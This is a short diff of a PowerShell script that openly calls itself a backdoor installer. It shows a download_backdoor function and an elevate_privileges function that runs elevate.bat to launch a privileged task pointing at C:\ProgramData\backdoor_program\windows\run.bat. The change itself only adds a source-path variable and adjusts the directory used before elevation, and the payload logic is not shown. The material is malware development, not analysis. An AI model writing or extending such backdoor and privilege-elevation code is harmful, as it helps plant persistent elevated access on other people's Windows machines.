@@ -40,6 +40,7 @@ $task_to_execute = "C:\ProgramData\backdoor_program\windows\run.bat"
 $is_git_ready=$false
 $program_git_location = $location_root+"\"+$folder_name
 $program_location = $location_root+"\"+$folder_name+"\windows\"
+$program_src_location = $program_location+"\src\"
 $git_client = "https://github.com/git-for-windows/git/releases/download/v2.24.0.windows.1/Git-2.24.0-64-bit.exe"
 
 
@@ -130,7 +131,7 @@ function download_backdoor {
 
 function elevate_privileges {
 	"FN: Elevando privilegios git"
-	Set-Location $program_git_location
+	Set-Location $program_src_location
 	try {
 		Start-Process "elevate.bat" -argumentlist "$privileged_task $task_to_execute" -wait
 	} catch {
